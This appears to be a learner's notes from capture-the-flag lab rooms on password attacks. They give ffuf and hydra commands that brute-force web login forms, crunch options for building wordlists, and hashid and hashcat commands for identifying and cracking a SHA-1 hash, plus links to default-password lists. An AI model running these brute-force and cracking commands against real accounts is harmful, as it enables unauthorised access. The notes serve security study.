````shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
````

#ffuf 

Word list: [[Automated Discovery]]

```bash
hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
```

#hydra


default passwords:

- [https://cirt.net/passwords](https://cirt.net/passwords)
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

https://wiki.skullsecurity.org/index.php?title=Passwords

Generate passwords:

`crunch 8 8 0123456789abcdefABCDEF -o crunch.txt` the file generated is 459 GB and contains 54875873536 words.

crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:  

@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

`user@thm$  crunch 6 6 -t pass%%`
           
Crunch will now generate the following amount of data: 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 100 pass00 pass01 pass02 pass03`


### CUPP - Common User Passwords Profiler

detect hash type
`λ kali ~ → hashid 8d6e34f987851aa599257d3831a1af040886842f`


dict based attack on sha-1
`λ kali ~ → hashcat -m 100 -a 0 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt`
